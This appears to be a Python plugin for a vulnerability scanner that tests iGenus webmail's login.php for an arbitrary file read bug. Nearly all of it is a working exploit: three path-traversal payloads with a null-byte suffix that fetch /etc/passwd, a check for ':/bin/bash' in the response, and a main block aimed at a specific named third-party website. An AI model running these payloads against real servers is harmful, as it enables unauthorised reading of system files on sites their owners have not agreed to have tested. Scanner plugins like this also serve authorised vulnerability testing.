#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = iGenus /index.php任意文件读取漏洞
#_FileName_ = IGENUS.py
######建议把之上的东西都带上，以便于辨认######


def assign(service, arg):
    if service == "igenus":
        return True, arg

def audit(arg):
    payloads = ['login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg',
            'webroot/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg',
            'igenus/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg']
    for url in payloads:
        payload = arg+url
        code, head, body, _, _ = curl.curl(payload)
        if code == 200 and ':/bin/bash' in body:
            security_warning('IGENUS login.php 任意文件读取  '+payload)
            break

if __name__ == '__main__':
    from dummy import *
    audit(assign('igenus', 'http://www.bjcsf.com.cn/')[1])